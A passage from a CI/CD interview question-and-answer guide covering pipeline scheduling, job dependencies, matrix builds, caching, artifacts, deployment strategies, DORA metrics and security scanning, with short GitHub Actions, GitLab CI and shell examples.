If a feature takes weeks, split it into small pieces and hide the unfinished parts behind a feature flag instead of keeping one big branch.

## 70: What is a nightly build?

A nightly build is a pipeline that runs on a schedule, usually once a night. It is used for slow checks that you don't want to run on every commit, like a full E2E suite, performance tests, dependency scans or building packages for all platforms.

It should not replace running fast checks on every commit.

## 71: How do you schedule a pipeline?

Most tools support cron syntax for schedules.

```yaml
# GitHub Actions
on:
  schedule:
    - cron: "0 3 * * 1-5" # 03:00 UTC, Monday to Friday
```

In GitLab you set up schedules in the project settings (Build > Pipeline schedules). In Jenkins you use `triggers { cron('H 3 * * 1-5') }`. Schedules in GitHub Actions use UTC and only run on the default branch.

## 72: How do you start a pipeline manually?

In GitHub Actions you add the `workflow_dispatch` trigger, which adds a "Run workflow" button. You can also define inputs.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
```

In GitLab you can run a pipeline from the UI, or mark a job with `when: manual` so it waits for a click. In Jenkins you click "Build Now" or "Build with Parameters".

## 73: What is a manual approval step?

A manual approval is a point in the pipeline where it stops and waits for a person to approve before continuing, usually before deploying to production.

In GitHub Actions this is done with environments that have required reviewers. In GitLab with `when: manual` jobs and protected environments. In Jenkins with the `input` step. It gives a human a chance to check before the risky step.

## 74: How does a CI tool know that a step failed?

By the exit code of the command. On Linux and macOS, exit code `0` means success and anything else means failure. If a command in a step exits with a non-zero code, the step fails, and by default the job fails too.

```bash
npm test   # exits 1 if any test fails, so the step fails
```

This is why your scripts should exit with a non-zero code on errors, and why `set -e` is useful in shell scripts.

## 75: Why is set -e useful in shell scripts in CI?

Without `set -e`, a shell script keeps going after a command fails, and the script can end with exit code `0` even though something broke in the middle. CI would then mark the step as passed.

```bash
#!/usr/bin/env bash
set -euo pipefail

npm ci
npm run build
./deploy.sh
```

`-e` stops on errors, `-u` fails on unset variables, and `-o pipefail` makes a pipe fail if any command in it fails. GitHub Actions runs `bash` steps with `-e` and `pipefail` by default when you set `shell: bash`.

## 76: What are pipeline logs?

Logs are the text output of every step in a pipeline run: commands, their output and errors. They are the first thing you read when a pipeline fails.

Good practices: print useful messages from your scripts, don't print secrets, and group noisy output so the important lines are easy to find.

## 77: What is a status badge?

A status badge is a small image you can put in your README that shows whether the latest pipeline on a branch passed or failed.

```markdown
![CI](https://github.com/my-org/my-repo/actions/workflows/ci.yml/badge.svg)
```

It gives anyone a quick look at the health of the project.

## 78: How do pipelines send notifications?

Most CI tools can notify people by email, or through integrations with Slack, Microsoft Teams and similar tools, when a pipeline fails, is fixed, or a deployment finishes.

It's best to notify only on things people need to act on, like failures on main or production deploys. If every run sends a message, people stop reading them.

## 79: What is the difference between hosted and self-hosted runners?

**Hosted runners** are machines provided by the CI service (like GitHub's `ubuntu-latest`). They need no maintenance, are clean for every job, and you pay per minute.

**Self-hosted runners** are machines you run yourself. You use them when you need special hardware (GPUs, ARM), access to private networks, more power, or lower cost at high volume. But you have to keep them updated, secure and cleaned between jobs.

## 80: How do you run jobs in parallel?

In most tools, jobs without dependencies between them run in parallel by default.

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run lint
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm test
```

Here `lint` and `test` run at the same time on separate runners. Running independent checks in parallel is one of the easiest ways to make a pipeline faster.

## 81: How do you make one job wait for another?

In GitHub Actions, use `needs`.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "testing"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying"
```

`deploy` only starts after `test` succeeds. In GitLab, jobs in later stages wait for earlier stages, and you can also use `needs` to wait for specific jobs.

## 82: What is a matrix build?

A matrix build runs the same job several times with different values, for example different Node.js versions or operating systems.

```yaml
jobs:
  test:
    strategy:
      matrix:
        node: [20, 22, 24]
        os: [ubuntu-latest, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci && npm test
```

This creates 6 jobs, one for each combination. It is very useful for libraries that support several versions.

## 83: What is a monorepo and why does it matter for CI?

A monorepo is a single repository that holds several projects, like a frontend, a backend and shared libraries. For CI it matters because:

- Running every check for every project on every change can be slow.
- You want to build and test only what changed and what depends on it.
- One broken project can block merges for everyone.

Tools like Nx, Turborepo and path filters in the CI config help with this.

## 84: What are common build tools you see in pipelines?

- **JavaScript/TypeScript**: npm, pnpm or yarn scripts, with Vite, webpack, esbuild or `tsc`
- **Java**: Maven, Gradle
- **.NET**: `dotnet` CLI
- **Python**: pip, Poetry, uv
- **Go**: `go build`, `go test`
- **Containers**: Docker, BuildKit
- **General**: Make, Bazel

A good pattern is to keep the real logic in these tools (for example `npm run build`) so the pipeline just calls them. Then the same command works locally and in CI.

## 85: What is a smoke test?

A smoke test is a quick, basic check that the app works after a build or deployment: does it start, does the home page load, does the health endpoint return 200, can a user log in.

```bash
curl --fail --silent https://staging.example.com/health
```

If a smoke test fails, there is no point running longer tests, and you should roll back the deployment.

## 86: What is a health check endpoint?

A health check is an endpoint like `/health` or `/healthz` that returns a success status when the app is running correctly. Load balancers, Kubernetes and deployment pipelines call it to decide if an instance is ready to receive traffic.

```js
app.get("/health", (req, res) => {
  res.status(200).json({ status: "ok" });
});
```

A more detailed check might also test the database connection, but be careful not to make it too slow or too strict.

## 87: What is a regression test?

A regression test checks that something that used to work still works after a change. Every time you fix a bug, it's a good idea to add a test for it so the same bug can't come back without the pipeline noticing.

In practice, your whole automated test suite acts as a regression suite on every pipeline run.

## 88: What is a flaky test?

A flaky test passes sometimes and fails sometimes, without any code change. Common causes: timing issues, tests that depend on each other, shared data, network calls, random data or the current date.

Flaky tests are harmful because people start ignoring red builds and re-running pipelines until they pass. They should be fixed or quarantined quickly.

## 89: What is DevOps?

DevOps is a way of working where development and operations work closely together, instead of developers throwing code "over the wall" to an ops team. It focuses on automation, shared responsibility for running software, fast feedback and small frequent changes.

CI/CD is one of the main practices of DevOps, along with infrastructure as code, monitoring and a blameless culture around incidents.

## 90: What is GitOps?

GitOps is a way of deploying where the desired state of your system (for example Kubernetes manifests) is stored in Git, and a tool running in the cluster, like Argo CD or Flux, keeps the real system in sync with Git.

To deploy, you change a file in Git, for example the image tag. The tool sees the change and applies it. Git becomes the single source of truth and the history of every deployment.

## 91: What does "build once, deploy many" mean?

It means you build the artifact (for example a Docker image) only once, and deploy that exact same artifact to staging and then production. You don't rebuild for each environment.

If you rebuild for production, you might get different dependencies or a different result from what you tested. Differences between environments should come from configuration, not from different builds.

## 92: What is environment parity?

Environment parity means keeping development, staging and production as similar as possible: same OS, same runtime versions, same database engine, same way of deploying.

The more they differ, the more bugs will only show up in production. Containers and infrastructure as code make parity much easier.

## 93: Why shouldn't you commit .env files?

`.env` files usually hold secrets and machine-specific settings like database passwords and API keys. If you commit them, the secrets end up in the Git history and anyone with repo access can see them.

Add `.env` to `.gitignore`, commit a `.env.example` file with placeholder values instead, and give real values to the pipeline through the CI tool's secrets.

## 94: What is a webhook in CI/CD?

A webhook is an HTTP request that one system sends to another when something happens. For example, GitHub sends a webhook to Jenkins when someone pushes, and Jenkins starts a build.

Webhooks are also used to notify other systems when a deployment is done, or to trigger a pipeline from an external tool.

## 95: What is the difference between polling and webhooks for triggering builds?

With **polling**, the CI server checks the repository every few minutes for new commits. It is simple but slow and wastes requests.

With **webhooks**, the Git host tells the CI server right away when something changes. It is faster and more efficient, so it is the normal choice. Polling is mostly used when the CI server can't receive incoming requests, for example behind a firewall.

## 96: What is a job timeout?

A timeout is the maximum time a job is allowed to run before the CI tool stops it. It protects you from jobs that hang forever, for example waiting on a network call or a test that never finishes, and wasting runner time.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
```

Set timeouts a bit above the normal run time, so hanging jobs fail fast.

## 97: How do you let a job fail without failing the whole pipeline?

Sometimes a job is useful but not critical, like an experimental check.

```yaml
# GitHub Actions
- run: npm run experimental-check
  continue-on-error: true
```

```yaml
# GitLab
experimental:
  script: npm run experimental-check
  allow_failure: true
```

Use this carefully. If nobody looks at failures of optional jobs, they are just noise.

## 98: How do you run a step only under certain conditions?

Use conditions. In GitHub Actions, the `if` keyword:

```yaml
- name: Deploy
  if: github.ref == 'refs/heads/main'
  run: ./deploy.sh
```

In GitLab, use `rules`:

```yaml
deploy:
  script: ./deploy.sh
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
```

In Jenkins, use a `when { branch 'main' }` block in the stage.

## 99: What are path filters?

Path filters let you run a pipeline only when certain files change.

```yaml
on:
  push:
    paths:
      - "src/**"
      - "package.json"
    paths-ignore:
      - "docs/**"
```

This saves time, for example by not running the full test suite when only the README changed. GitLab has `rules: changes:` for the same purpose.

## 100: How do you skip CI for a commit?

Most tools look for a special text in the commit message, like `[skip ci]` or `[ci skip]`.

```bash
git commit -m "Update README [skip ci]"
```

GitHub Actions, GitLab and others support this. It is handy for docs-only changes, but be careful: if required checks don't run, the pull request may not be mergeable.

## 101: Why do most jobs start with a checkout step?

A job runs on a fresh machine that has none of your code on it. The checkout step clones the repository at the commit that triggered the pipeline, so the next steps have something to build and test.

```yaml
steps:
  - uses: actions/checkout@v6
```

GitLab and Jenkins usually do the checkout for you automatically. In GitHub Actions you have to add it yourself. By default `actions/checkout` fetches only the latest commit (`fetch-depth: 1`) to save time.

## 102: What is the workspace of a job?

The workspace is the folder on the runner where the code is checked out and where the steps run. Files you create in one step are there for the next step in the same job.

In GitHub Actions the path is in `GITHUB_WORKSPACE`, in GitLab it is `CI_PROJECT_DIR`, and in Jenkins it is `WORKSPACE`. When the job ends, the workspace is thrown away on hosted runners.

## 103: What are predefined CI variables?

Every CI tool gives you built-in variables with information about the current run:

| Info       | GitHub Actions      | GitLab CI          | Jenkins        |
| ---------- | ------------------- | ------------------ | -------------- |
| Commit SHA | `GITHUB_SHA`        | `CI_COMMIT_SHA`    | `GIT_COMMIT`   |
| Branch     | `GITHUB_REF_NAME`   | `CI_COMMIT_BRANCH` | `BRANCH_NAME`  |
| Run number | `GITHUB_RUN_NUMBER` | `CI_PIPELINE_IID`  | `BUILD_NUMBER` |
| Is CI      | `CI=true`           | `CI=true`          | (set by you)   |

Many tools check `CI=true` to change their behavior, for example test runners turn off watch mode.

## 104: What is the difference between a variable and a secret in CI?

Both are values given to the pipeline, but:

- **Variables** are for non-sensitive settings like `NODE_ENV` or a public API URL. They can be shown in logs and stored in the pipeline file.
- **Secrets** are encrypted, hidden in logs, and can't be read back from the UI after you save them. They are for passwords, tokens and keys.

In GitHub Actions they are `vars.NAME` and `secrets.NAME`. In GitLab both are CI/CD variables, but you mark sensitive ones as "masked" and often "protected".

## 105: What does it mean when a secret is masked?

Masking means the CI tool replaces the secret's value with `***` if it shows up in the logs. It is a safety net in case a script prints it by mistake.

Masking is not perfect. If the secret is changed before it is printed (for example base64 encoded, or split into parts), it can still leak. So don't print secrets at all, even if they are masked.

## 106: How would you deploy a static website with a pipeline?

1. Install dependencies and run the build (`npm run build`), which creates a folder like `dist/`.
2. Upload that folder to a static host: S3 with CloudFront, GitHub Pages, Netlify, Vercel, Cloudflare Pages or Azure Static Web Apps.
3. If there is a CDN in front, clear its cache for files that don't have a hash in the name, like `index.html`.

```yaml
- run: npm ci && npm run build
- run: aws s3 sync dist/ s3://my-site-bucket --delete
```

## 107: How would you deploy a simple Node.js API with a pipeline?

A common modern approach:

1. Run lint and tests.
2. Build a Docker image with the app.
3. Push the image to a registry, tagged with the commit SHA.
4. Tell the hosting platform to run the new image (Kubernetes, ECS, Cloud Run, Azure Container Apps, Fly.io, Render).
5. Run a smoke test against the health endpoint.

Older setups copy the code to a server over SSH and restart the process with PM2 or systemd. That still works, but it is harder to roll back and keep consistent.

## 108: What is a preview environment?

A preview environment (or review app) is a temporary copy of the app deployed for one pull request, with its own URL. Reviewers, designers and testers can try the change before it is merged.

Vercel, Netlify and Cloudflare Pages do this for frontends out of the box. GitLab has "review apps". The environment should be deleted when the pull request is closed.

## 109: What is a release branch?

A release branch is a branch created from main to prepare a specific release, like `release/2.3`. Only bug fixes go into it, while new work continues on main.

They are common for software that ships on a schedule or has several versions supported at the same time. Teams doing continuous deployment usually don't need them.

## 110: What is a hotfix?

A hotfix is an urgent fix for a bug in production. In a simple flow you fix it on a short branch from main, merge it, and the normal pipeline deploys it.

If production runs an older release than main, you create the fix on the release branch or tag, deploy it, and then make sure the same fix also gets into main so the bug doesn't come back.

## 111: What is a changelog?

A changelog is a file or page listing what changed in each release: new features, fixes and breaking changes. It helps users and teammates see what's new without reading commits.

Many pipelines generate it automatically from commit messages or from small change files, for example with semantic-release, release-please or Changesets.

## 112: What is a package registry?

A package registry stores and shares libraries: npm for JavaScript, PyPI for Python, Maven Central for Java, NuGet for .NET. There are also private registries like GitHub Packages, GitLab Package Registry, JFrog Artifactory and Sonatype Nexus.

A release pipeline for a library builds the package and publishes it to a registry, usually when a version tag is pushed.

## 113: What is a container?

A container is a running process packaged with everything it needs: code, runtime, libraries and settings, isolated from other processes on the same machine. It is started from an image.

Containers are lighter than virtual machines because they share the host's kernel. In CI/CD they make the app run the same way on a laptop, on the CI runner and in production.

## 114: How do you build a Docker image in a pipeline?

You need a `Dockerfile` in the repo and a runner with Docker or BuildKit.

```yaml
- uses: actions/checkout@v6
- run: docker build -t ghcr.io/my-org/my-app:${{ github.sha }} .
- run: echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
- run: docker push ghcr.io/my-org/my-app:${{ github.sha }}
```

In practice many teams use the official `docker/build-push-action`, which adds caching and multi-platform builds.

## 115: How does Kubernetes fit into CD?

Kubernetes runs containers across a group of machines. In a CD setup, the pipeline builds and pushes an image, and then the Kubernetes deployment is updated to use the new image tag.

This update can be done by the pipeline (`kubectl apply`, `helm upgrade`) or by a GitOps tool like Argo CD that watches a Git repo. Kubernetes then does a rolling update and replaces old pods with new ones.

## 116: How do you deploy a serverless function from a pipeline?

You package the code and use the provider's CLI or an IaC tool to upload it.

```bash
# AWS Lambda with the AWS CLI
zip -r function.zip dist/ node_modules/
aws lambda update-function-code --function-name my-fn --zip-file fileb://function.zip
```

For more than one function, teams usually use AWS SAM, AWS CDK, Serverless Framework, SST or Terraform so the functions, permissions and triggers are all in code.

## 117: What are database migrations and why run them in a pipeline?

Migrations are versioned scripts that change the database schema, like adding a table or a column. Tools include Prisma Migrate, Flyway, Liquibase, Knex, Alembic and Entity Framework migrations.

Running them from the pipeline makes sure every environment gets the same schema changes in the same order, instead of someone running SQL by hand. They usually run as a step just before or as part of the deployment.

## 118: What is a zero-downtime deployment?

It is a deployment where users don't notice any outage. The new version is started and checked before the old one is stopped, and traffic is moved over gradually or all at once.

Rolling, blue-green and canary deployments can all give you zero downtime, as long as health checks work and the database changes are compatible with both versions.

## 119: What is MTTR?

MTTR is mean time to recovery (or restore): the average time it takes to get the service working again after a failure in production.

Good CI/CD lowers MTTR because you can roll back or ship a fix in minutes. It's one of the four DORA metrics.

## 120: What are the DORA metrics?

DORA (DevOps Research and Assessment) found four metrics that show how well a team delivers software:

1. **Deployment frequency**: how often you deploy to production
2. **Lead time for changes**: time from commit to running in production
3. **Change failure rate**: percentage of deployments that cause a failure
4. **Time to restore service**: how long it takes to recover from a failure

The first two measure speed, the last two measure stability. Good teams are fast and stable at the same time. Newer DORA reports also look at reliability and rework rate.

## 121: What is deployment frequency?

It's how often a team deploys to production: several times a day, once a week, once a month and so on. Teams with good CI/CD deploy often, in small batches.

Small, frequent deployments are less risky than big ones, because each one changes less and is easier to fix or roll back.

## 122: What is lead time for changes?

Lead time is how long it takes for a commit to reach production. It includes waiting for review, the pipeline run time, waiting for approvals and the deployment itself.

If lead time is long, look at where changes wait the most. Often it's code review or manual approvals, not the pipeline.

## 123: What is change failure rate?

It's the percentage of production deployments that cause a problem that needs a fix, like a rollback, a hotfix or an incident.

If 2 out of 20 deployments caused issues, the change failure rate is 10%. Better tests, smaller changes and canary releases help lower it.

## 124: What does "shift left" mean?

Shift left means moving checks earlier in the development process ("left" on a timeline). Instead of finding bugs or security issues just before release, you find them in the editor, in pre-commit hooks or in the pull request pipeline.

Examples: running security scans on every pull request, type checking in the editor, and testing on every commit instead of in a separate QA phase.

## 125: What is a quality gate?

A quality gate is a rule in the pipeline that must be met before the change can move forward. For example:

- All tests pass
- Coverage on new code is above 80%
- No new critical security issues
- No new code smells above a set level

If the gate fails, the pipeline stops. SonarQube has quality gates built in, but any required check is a kind of gate.

## 126: What is SonarQube?

SonarQube (and the cloud version, SonarQube Cloud, formerly SonarCloud) is a tool for static code analysis. It finds bugs, security issues, code smells, duplicated code and shows test coverage.

You run a scanner in the pipeline that sends results to the SonarQube server, which then checks the quality gate and can comment on the pull request.

## 127: What is dependency scanning?

Dependency scanning checks the libraries your project uses against databases of known vulnerabilities (CVEs). If you use a version of a package with a known problem, the scan reports it.

Tools include `npm audit`, GitHub Dependabot alerts, Snyk, OWASP Dependency-Check, Trivy and GitLab dependency scanning. It usually runs in the pipeline and on a schedule, because new vulnerabilities are found in old versions all the time.

## 128: What are Dependabot and Renovate?

Both are bots that open pull requests to update your dependencies automatically. When a new version of a package is released, they create a PR that bumps the version, and your CI pipeline tests it.

Dependabot is built into GitHub. Renovate works with GitHub, GitLab, Bitbucket and others and has more configuration options, like grouping updates and auto-merging minor versions.

## 129: What is SAST?

SAST (static application security testing) scans the source code for security problems without running it, for example SQL injection, unsafe use of `eval`, or hardcoded passwords.

Tools include GitHub CodeQL, Semgrep, SonarQube and GitLab SAST. It fits well in pull request pipelines because it only needs the code.

## 130: What is DAST?

DAST (dynamic application security testing) tests the running app from the outside, like an attacker would: sending bad input, checking headers, looking for XSS and other issues. OWASP ZAP is a common free tool.

Because it needs a running app, DAST usually runs against a staging or preview environment, often on a schedule or before a release.

## 131: Can you run a pipeline locally?

Not exactly, but you can get close:

- For GitHub Actions, the open source tool `act` runs workflows in Docker on your machine.
- For any tool, keep the real logic in scripts or `npm run` commands that you can run locally.
- Run the job's Docker image locally to reproduce the environment.

The second point is the most useful. If the pipeline is only a thin wrapper around commands you can run yourself, debugging is much easier.

## 132: What statuses can a pipeline run have?

Common statuses:

- **Queued / pending**: waiting for a runner
- **Running**: in progress
- **Success / passed**: all required jobs passed
- **Failed**: at least one required job failed
- **Canceled**: stopped by a user or by a newer run
- **Skipped**: didn't run because of conditions
- **Waiting / blocked**: waiting for a manual approval

## 133: How do you re-run a failed job?

Most tools have a "Re-run" button for the whole pipeline or only the failed jobs. In GitHub Actions you can choose "Re-run failed jobs". From the CLI you can use `gh run rerun <run-id> --failed`.

Re-running is fine for a real infrastructure hiccup, but if you often need to re-run to get green, you have a flaky test or an unstable environment that should be fixed.

## 134: What is cron syntax?

Cron syntax is a way to describe a schedule with five fields: minute, hour, day of month, month, day of week.

```text
┌──── minute (0-59)
│ ┌── hour (0-23)
│ │ ┌ day of month (1-31)
│ │ │ ┌ month (1-12)
│ │ │ │ ┌ day of week (0-6, Sunday = 0)
0 2 * * 1     every Monday at 02:00
*/15 * * * *  every 15 minutes
```

Check which time zone your CI tool uses. GitHub Actions uses UTC.

## 135: What is the GitHub Marketplace for actions?

It's a catalog of actions published by GitHub and the community, like actions for setting up languages, deploying to clouds, sending Slack messages or scanning code.

They save a lot of time, but each action runs code in your pipeline with access to your secrets, so prefer actions from known publishers, look at the source, and pin them to a version.

## 136: What is Azure Pipelines?

Azure Pipelines is the CI/CD service in Azure DevOps. Pipelines are defined in `azure-pipelines.yml` with stages, jobs and steps, and can build code from Azure Repos, GitHub or other Git hosts.

It's common in companies that use Microsoft tools and .NET, but it supports any language. It also has "classic" pipelines configured in the UI, which are the older way.

## 137: What is CircleCI?

CircleCI is a hosted CI/CD service. You define pipelines in `.circleci/config.yml`. It's known for fast builds, good Docker support, and "orbs", which are reusable config packages, similar to actions in GitHub Actions.

It works with GitHub, GitLab and Bitbucket repos.

## 138: What is Argo CD?

Argo CD is a GitOps tool for Kubernetes. It runs inside the cluster, watches a Git repository with Kubernetes manifests (plain YAML, Helm charts or Kustomize), and keeps the cluster in sync with what's in Git.

It shows you in a UI which apps are in sync, which have drifted, and lets you roll back to a previous Git commit. Flux is a similar tool.

## 139: What is a pre-commit hook and how is it different from CI?

A pre-commit hook is a script that Git runs on the developer's machine before creating a commit. It's often used to format code and run a quick lint, with tools like Husky with lint-staged, Lefthook or the `pre-commit` framework.

Hooks give faster feedback, but they can be skipped with `--no-verify` and they depend on each developer's setup. CI is the check that can't be skipped. Use both: hooks for speed, CI for the final word.

## 140: What does "fail fast" mean in a pipeline?

It means ordering the pipeline so the cheapest and most likely failures are found first. For example: lint and type check (seconds), then unit tests (a minute), then build, then the slow E2E tests.

Developers get feedback in a minute or two for common mistakes, and you don't spend 20 minutes on E2E tests for a change that has a typo.

## 141: What is artifact retention?

Retention is how long the CI system keeps artifacts and logs before deleting them. Keeping everything forever costs storage, so most tools have a default (GitHub Actions keeps artifacts for 90 days by default) that you can change.

```yaml
- uses: actions/upload-artifact@v5
  with:
    name: coverage
    path: coverage/
    retention-days: 7
```

Release artifacts should be kept in a proper registry, not only as CI artifacts.

## 142: What is the difference between a workflow, a pipeline and a run?

- **Pipeline** or **workflow** is the definition: the YAML file describing jobs and triggers. GitHub calls it a workflow, most other tools call it a pipeline.
- **Run** (or build, or pipeline instance) is one execution of that definition, for one commit or one trigger.

So one workflow file can have thousands of runs over time.

## 143: What is a deploy key?

A deploy key is an SSH key that gives access to a single repository, instead of a whole user account. It's used when a server or pipeline needs to clone or push to one repo.

It's safer than using a personal access token or a developer's SSH key, because if it leaks, only that one repo is affected. Many cases are now better handled with the CI tool's built-in token or a GitHub App.

## 144: What is a personal access token and why is it risky in CI?

A personal access token (PAT) is a token tied to a user account that acts like that user's password for the API. Using one in CI means the pipeline has all the access of that user, often to many repos.

If it leaks, the attacker gets that access. If the person leaves the company, the pipeline breaks. Prefer the built-in `GITHUB_TOKEN`, GitLab `CI_JOB_TOKEN`, GitHub Apps, deploy keys or OIDC, which are scoped and short-lived.

## 145: Why should pipelines be fast?

Developers wait for the pipeline before merging. If it takes 40 minutes, they switch to other work, lose context, merge bigger batches, and are tempted to skip checks.

A common goal is a pull request pipeline under 10 minutes. Parallel jobs, caching and running only what changed are the main ways to get there.

## 146: What does a good CI pipeline look like?

- It runs on every push and pull request
- It's fast, ideally under 10 minutes
- It's reliable: no flaky tests, failures mean something is really wrong
- It fails with clear messages
- It's defined in code and reviewed like code
- It uses the same commands developers use locally
- It doesn't contain secrets in the code
- Main is kept green

## 147: What are common mistakes beginners make with CI/CD?

- Using `npm install` instead of `npm ci`
- Putting secrets in the YAML file
- Deploying with the `latest` tag
- Building a new artifact for each environment
- Writing all the logic in YAML instead of scripts
- Ignoring flaky tests and re-running until green
- No timeouts on jobs
- Using third-party actions without pinning a version

## 148: What is the difference between CI/CD and a build server?

A build server is just a machine that compiles code. CI/CD is the whole practice: merging often, testing every change automatically, keeping the main branch releasable, and deploying in an automated, repeatable way.

You can have a build server and still not do CI, for example if people only merge once a month.

## 149: Who is responsible for the pipeline?

The team that owns the code. In a DevOps culture, developers write and maintain their pipeline files, just like their code. A platform or DevOps team may provide shared templates, runners and tools, but each team is responsible for keeping its own pipeline green and fast.

## 150: How do you start adding CI to a project that has none?

Start small and add things step by step:

1. A pipeline that installs dependencies and builds on every push and pull request.
2. Add lint and type checks.
3. Add the existing unit tests, even if there are few.
4. Make these checks required for merging into main.
5. Add deployment to a staging environment.
6. Add more tests and checks over time.

A simple pipeline that runs on every change is much better than a perfect one planned for months.

# Moderate Questions (151-300)

## 151: How would you design a CI pipeline for a typical Node.js web app?

A common layout for pull requests:

1. **Install** with `npm ci` and a dependency cache.
2. **Static checks** in parallel: lint, format check, type check.
3. **Unit tests** with coverage.
4. **Build** the app and save the output as an artifact.
5. **Integration and E2E tests** against the built app, with a database as a service container.
6. **Security checks**: dependency audit, SAST, secret scanning.

On main, add: build and push the Docker image, deploy to staging, run smoke tests, then deploy to production (automatically or after approval). Keep the PR part under 10 minutes if you can.

## 152: Can you write a full GitHub Actions CI workflow for a Node.js project?

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  checks:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npx tsc --noEmit
      - run: npm test -- --coverage
      - run: npm run build
      - uses: actions/upload-artifact@v5
        with:
          name: dist
          path: dist/
```

It reads the Node version from `.nvmrc`, caches npm downloads, gives the token read-only access, and cancels older runs on the same branch.

## 153: How does dependency caching work in GitHub Actions?

The simplest way is the `cache` option of the setup actions (`setup-node`, `setup-python`, `setup-java`, `setup-go`). It caches the package manager's download folder using a key built from the lock file.

For anything else, use `actions/cache` directly:

```yaml
- uses: actions/cache@v5
  with:
    path: ~/.cache/ms-playwright
    key: playwright-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      playwright-${{ runner.os }}-
```

Caching `~/.npm` instead of `node_modules` is the usual advice for npm, because `npm ci` deletes `node_modules` anyway.

## 154: What are cache keys and restore keys?

The **key** is the exact name of the cache entry. If an entry with that key exists, it's restored (a cache hit). It's usually built from a hash of the lock file, so it changes when dependencies change.

**Restore keys** are fallbacks. If there is no exact match, the tool looks for the newest entry whose key starts with one of the restore keys. You get an older cache that is mostly right, and the package manager downloads only what's missing.

In GitHub Actions a cache is saved only when there was no exact hit, and caches can't be overwritten, so a good key design matters.

## 155: How does caching work in GitLab CI?

You define `cache` on a job or in `default`, with a key and paths. Using `key:files` makes the key change when the lock file changes.

```yaml
default:
  image: node:22
  cache:
    key:
      files:
        - package-lock.json
    paths:
      - .npm/

install:
  script:
    - npm ci --cache .npm --prefer-offline
```

Cache paths must be inside the project folder. You can use `policy: pull` on jobs that only read the cache, so they don't spend time uploading it again.

## 156: How do artifacts work in GitLab CI?

A job lists the files to keep under `artifacts`. Jobs in later stages download artifacts from earlier stages automatically, and with `needs` you control exactly which ones.

```yaml
build:
  stage: build
  script: npm run build
  artifacts:
    paths:
      - dist/
    expire_in: 1 week

test:
  stage: test
  needs: [build]
  script: npm run test:e2e
```

`expire_in` deletes old artifacts so they don't fill up storage. Artifacts can also be test reports with `artifacts:reports:junit`, which GitLab shows in merge requests.

## 157: How do you pass files between jobs in GitHub Actions?

Each job runs on a different machine, so you upload files in one job and download them in another.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v5
        with:
          name: dist
          path: dist/

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v5
        with:
          name: dist
          path: dist/
      - run: ls dist
```

For small values like a version string, use job outputs instead of artifacts.

## 158: What is a DAG pipeline in GitLab?

By default GitLab runs stages in order, and a job waits for all jobs in previous stages. With `needs`, a job starts as soon as the specific jobs it depends on finish, even if other jobs in the earlier stage are still running. This creates a directed acyclic graph (DAG).

```yaml
build-frontend:
  stage: build
  script: make frontend

build-backend:
  stage: build
  script: make backend

test-frontend:
  stage: test
  needs: [build-frontend]
  script: make test-frontend
```

`test-frontend` doesn't wait for the slow backend build. This can save a lot of time in pipelines with independent parts.

## 159: How do you share values between jobs in GitHub Actions?

Use job outputs. A step writes to `GITHUB_OUTPUT`, the job maps it to an output, and other jobs read it through `needs`.

```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.v.outputs.tag }}
    steps:
      - id: v
        run: echo "tag=1.4.${{ github.run_number }}" >> "$GITHUB_OUTPUT"

  deploy:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.version.outputs.tag }}"
```

Outputs are strings and are meant for small values. Secrets in outputs are masked and may be dropped, so don't use outputs to pass secrets.

## 160: What are GITHUB_ENV, GITHUB_OUTPUT and GITHUB_STEP_SUMMARY?

They are files that steps write to in order to talk to the runner:

- `GITHUB_ENV`: sets an environment variable for the following steps in the same job.
- `GITHUB_OUTPUT`: sets an output for the current step, readable as `steps.<id>.outputs.<name>`.
- `GITHUB_STEP_SUMMARY`: Markdown that is shown on the run's summary page.

```bash
echo "BUILD_TIME=$(date -u +%FT%TZ)" >> "$GITHUB_ENV"
echo "### Tests passed :white_check_mark:" >> "$GITHUB_STEP_SUMMARY"
```

The old `::set-output` and `::set-env` commands are deprecated and should not be used.

## 161: What are contexts and expressions in GitHub Actions?

Expressions are written as `${{ ... }}` and are evaluated before the step runs. Contexts are objects you can read inside them:

- `github`: event info, like `github.ref`, `github.sha`, `github.event_name`
- `env`, `vars`, `secrets`: variables and secrets
- `matrix`, `strategy`: matrix values
- `needs`, `steps`, `job`, `runner`, `inputs`

```yaml
- if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
  run: echo "Release ${{ github.ref_name }}"
```

There are also functions like `contains()`, `startsWith()`, `hashFiles()`, `toJSON()`, `fromJSON()`, `success()`, `failure()` and `always()`.

## 162: How do success(), failure(), always() and cancelled() work in GitHub Actions?

They are status functions used in `if`:

- `success()`: the default, runs only if all previous steps passed
- `failure()`: runs only if a previous step failed
- `always()`: runs no matter what, even if the job was canceled
- `cancelled()`: runs only if the run was canceled

```yaml
- run: npm test
- if: failure()
  uses: actions/upload-artifact@v5
  with:
    name: test-screenshots
    path: test-results/
```

